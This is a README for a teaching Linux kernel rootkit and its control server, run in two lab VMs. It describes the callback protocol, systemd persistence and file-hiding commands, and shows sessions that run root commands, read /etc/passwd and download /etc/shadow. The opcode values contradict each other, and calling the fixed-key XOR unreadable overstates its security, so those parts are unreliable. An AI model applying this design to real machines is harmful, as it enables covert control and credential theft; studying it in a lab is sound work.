# WLKOM — Wild Linux Kernel Object Module

Pedagogical Linux rootkit split into two components:

- **Control server** (`attacking_program/`): runs on the attacker VM, listens for the rootkit to connect, authenticates it, and exposes an interactive command shell.
- **Rootkit** (`rootkit/`): a Linux kernel module loaded on the victim VM. It contacts the control server, authenticates, and executes commands received from it.

---

## Network overview

```
Host machine
├── Attacker VM  — ens3 (NAT, SSH :2222)
│                — ens4 (192.168.100.10, private)
└── Victim VM    — ens3 (NAT, SSH :2223)
                 — ens4 (192.168.100.20, private)

Rootkit (victim) ──TCP 192.168.100.10:4444──► Control server (attacker)
```

The two VMs share a QEMU socket-based virtual network — no Internet required.

### Protocol

```
[1 byte  : opcode]
[4 bytes : payload length, big-endian]
[N bytes : XOR-encrypted payload (32-byte key)]
```

| Opcode | Value | Description |
|---|---|---|
| `AUTH` | 0x01 | Authentication handshake |
| `EXEC` | 0x02 | Execute a shell command on the victim |
| `UPLOAD` | 0x03 | Send a file to the victim |
| `DOWNLOAD` | 0x04 | Retrieve a file from the victim |
| `HIDE_FILE` | 0x05 | Hide a file/dir from `ls` |
| `UNHIDE_FILE` | 0x06 | Unhide a file/dir |
| `HIDE_LINE` | 0x07 | Filter lines containing a pattern in a file |
| `UNHIDE_LINE` | 0x08 | Remove a line filter |
| `PING` | 0x09 | Connectivity check |
| `PONG` | 0x0A | Ping response |

---

## Prerequisites

- CPU with Intel VT-x or AMD-V: `grep -E 'vmx|svm' /proc/cpuinfo`
- QEMU/KVM, `genisoimage`, `wget` — installed automatically by `init.sh`
- ~5 GB free disk (two 8G qcow2 images, sparse)
- Internet connection for the first run (~300 MB Debian cloud image download)

---

## Quick start

```bash
# 1. Clone the project
cd wlkom-lapsus/

# 2. (Optional) edit .env to change IPs, ports, or credentials
cat scripts/.env

# 3. One-time setup (download image, generate SSH keys, create disks)
bash init.sh

# 4. Full deploy (starts VMs, waits for cloud-init, compiles + loads rootkit)
bash vms/deploy.sh

# 5. Launch the control server on the attacker VM
ssh -i vms/wlkom_key wlkom@localhost -p 2222
cd ~/attacking_program && ./wlkom_control 4444
# Password: wlk0m_s3cr3t

# 6. (Development) Iterate faster: change code, then
bash vms/deploy.sh code     # Recompile without restarting VMs
```

---

## Configuration — `scripts/.env`

All parameters live in `scripts/.env`. Every script sources it.

```bash
ATTACKER_IP=192.168.100.10    # Attacker VM IP on the private network
VICTIM_IP=192.168.100.20      # Victim VM IP on the private network
CONTROL_PORT=4444             # Port the control server listens on
VM_USER=wlkom                 # Username inside both VMs
VM_PASS=wlkom1234             # VM login password
ATTACKER_SSH_PORT=2222        # Host port → attacker SSH
VICTIM_SSH_PORT=2223          # Host port → victim SSH
DISK_SIZE=8G                  # Disk size per VM
RAM=2048                      # RAM per VM (MB)
CPUS=2                        # vCPUs per VM
```

---

## Step-by-step

### Step 1 — `bash init.sh` (one-time setup)

Run this once on the host. It:

1. Checks that KVM is available (`/dev/kvm`)
2. Installs QEMU, `genisoimage`, `wget` if missing
3. Generates an ED25519 SSH key pair at `vms/wlkom_key` + `vms/wlkom_key.pub`
4. Downloads the Debian 12 genericcloud base image to `temp/` (~300 MB, shared & reused)
5. Creates `attacker.qcow2` and `victim.qcow2` as copy-on-write overlays in `vms/`
6. Builds cloud-init seed ISOs from templates, substituting `.env` values and SSH keys

After this step, the project is ready. You only run this **once**.

### Step 2 — `bash vms/deploy.sh` (automated deployment)

Two deployment modes:

#### Full deployment (default)

```bash
bash vms/deploy.sh
```

Or explicitly:

```bash
bash vms/deploy.sh full
```

Performs **all steps**:

1. **Kills** any running VMs
2. **Starts** the attacker VM first (opens the socket), then the victim VM
3. **Waits** for SSH to be reachable on both VMs
4. **Waits** for cloud-init to finish (~2 min on first boot, instant on re-runs)
5. **Compiles** `attacking_program/` on the attacker VM
6. **Compiles** `rootkit/` on the victim VM
7. **Loads** the module with `sudo insmod wlkom.ko control_ip=... control_port=...`
8. **Installs** persistence (rootkit auto-loads via systemd)

After this step, both VMs are running with the rootkit loaded and waiting for connections.

#### Code-only deployment (faster iteration)

```bash
bash vms/deploy.sh code
```

Reuses running VMs and only:

1. **Compiles** `attacking_program/` on the attacker VM
2. **Compiles** `rootkit/` on the victim VM

**Does not**:
- Restart VMs
- Wait for cloud-init
- Load the rootkit module
- Setup persistence

**Use this when** developing — change code, run `bash vms/deploy.sh code`, then manually test. Much faster than restarting VMs.

### Step 3 — Launch the control server

On the attacker VM:

```bash
./wlkom_control 4444
# Password: wlk0m_s3cr3t
```

The rootkit retries the connection every 5 seconds. Within a few seconds:

```
[2026-01-01 12:00:00] WLKOM control listening on port 4444
[2026-01-01 12:00:05] New connection from 192.168.100.20:49200
[2026-01-01 12:00:05] Rootkit authenticated from 192.168.100.20:49200
```

---

## Command reference

| Command | Description |
|---|---|
| `ping` | Check if the rootkit is alive |
| `exec [cmd]` | Run shell commands: single mode or interactive loop |
| `upload <local> <remote>` | Send a file from attacker to victim |
| `download <remote> <local>` | Retrieve a file from victim |
| `hide_file <name>` | Hide a file/dir from `ls` and `readdir` |
| `unhide_file <name>` | Restore a hidden file |
| `hide_line <file> <pattern>` | Filter lines matching pattern in a file |
| `unhide_line <file> <pattern>` | Remove a line filter |
| `help` | Show command list |
| `exit` | Disconnect |

### Examples

**Single command execution:**

```
WLKOM > exec whoami
root

WLKOM > exec cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
```

**Interactive command loop (type `exec` alone) — `cd` persists across commands:**

```
WLKOM > exec
Entering command mode (type 'exit' to return to main menu)

exec > ls
bin boot dev etc home lib ...

exec > cd /tmp
exec [/tmp] > ls
.wlkom_out

exec [/tmp] > cd /home/wlkom
exec [/home/wlkom] > cat secret.txt
flag{...}

exec [/home/wlkom] > exit
Returned to main menu

WLKOM > ping
PONG

WLKOM > exit
[Disconnected]
```

**Other commands:**

```
WLKOM > upload /tmp/tool /tmp/tool
Upload: OK

WLKOM > download /etc/shadow ./shadow.txt
Downloaded 1842 bytes -> ./shadow.txt

WLKOM > hide_file wlkom.ko
hide_file request sent: wlkom.ko
```

---

## VM setup — design decisions

### Why Debian 12 + cloud images?

Debian's kernel does not enforce module signature verification without Secure Boot,
so unsigned `.ko` files load without signing infrastructure. Kernel 6.1 LTS is used as the target (see `rootkit/README.md` for technical
details on kernel compatibility).

Cloud images replace a traditional netinstall: no installer, no preseed file,
~2 min to a ready VM instead of 15–20 min.

### SSH key injection

`init.sh` generates `vms/wlkom_key` once. The public key is injected into each
VM's `user-data` via a `__SSH_PUBKEY__` placeholder. Cloud-init writes it to
`~/.ssh/authorized_keys` on first boot. `deploy.sh` uses `-i vms/wlkom_key` for
all SSH/SCP calls — no password prompts, no `sshpass`.

### Copy-on-write disks

Both VMs share the downloaded base image as a read-only backing file. Each overlay
only stores differences, saving ~300 MB compared to two independent copies.

### AZERTY keyboard

Configured via `keyboard: layout: fr` (cloud-init module) and
`localectl set-keymap fr` in `runcmd`. Both are needed because the two mechanisms
can race on first boot.

---

## Project structure

```
wlkom-lapsus/
├── init.sh                  — first-time setup (run once on host)
├── README.md
├── AUTHORS
├── attacking_program/
│   ├── README.md            — technical choices and design
│   ├── Makefile
│   ├── include/             — crypto.h, protocol.h, network.h, commands.h
│   └── src/                 — main.c, crypto.c, protocol.c, network.c, commands.c
├── rootkit/
│   ├── README.md            — technical choices and design
│   ├── Makefile
│   ├── assets/wlkom.service
│   ├── include/             — crypto.h, protocol.h, commands.h, network.h, hide.h, persist.h
│   └── src/                 — main.c, crypto.c, protocol.c, commands.c, network.c, hide.c, persist.c
└── scripts/
    ├── .env                 — all configuration
    ├── utils.sh
    ├── setup_vm.sh
    ├── deploy.sh
    └── cloud-init/
        ├── attacker/        — user-data, meta-data, network-config
        └── victim/          — user-data, meta-data, network-config
```

---

## Verifying network encryption

Both VMs have Wireshark and tshark pre-installed. The `wlkom` user is added to
the `wireshark` group, so no `sudo` is needed.

### Capture on the private interface

```bash
# On either VM — capture traffic on the private network interface
tshark -i ens4
```

### What you should see

When the rootkit connects and the operator runs commands, tshark will show TCP
segments between `192.168.100.10` and `192.168.100.20`. The payload bytes will
be unreadable noise — XOR-encrypted with the 32-byte key. No command text, no
output, no password will appear in cleartext.

Example with `-x` (hex + ASCII dump):

```
0000  00 01 00 00 00 0c 61 1d 55 1b 4b 17 55 0e 1b 0a   ......a.U.K.U...
0010  0a 1d 55 0a                                        ..U.
```

The first byte is the opcode (`0x00` = CMD_EXEC), the next 4 bytes are the
length in big-endian, and the rest is the XOR-encrypted payload. There is no
way to read the actual command without the key.

### Wireshark GUI

If you have X forwarding enabled (`ssh -X`):

```bash
wireshark &
```

Select `ens4` as the capture interface. You can confirm that TCP payloads
contain no plaintext strings by running `strings` on a captured `.pcap` file —
only the fixed 5-byte header (1 opcode + 4 length) will be consistent.

---

## Troubleshooting

**KVM not available** — check BIOS/UEFI for "Intel Virtualization Technology" or "AMD-V".

**`kvm` group not active** — log out and back in after `init.sh` adds you to the group.

**Victim VM fails to start** — always start the attacker first (it opens the socket).

**Rootkit does not appear in the control server** — check `sudo dmesg | grep WLKOM` on the victim.
The rootkit retries every 5 seconds automatically; make sure the control server is
running and the IP/port match `.env`.

**Missing kernel headers on victim**:
```bash
sudo apt-get install -y linux-headers-$(uname -r)
```

**Module already loaded**:
```bash
sudo rmmod wlkom
```
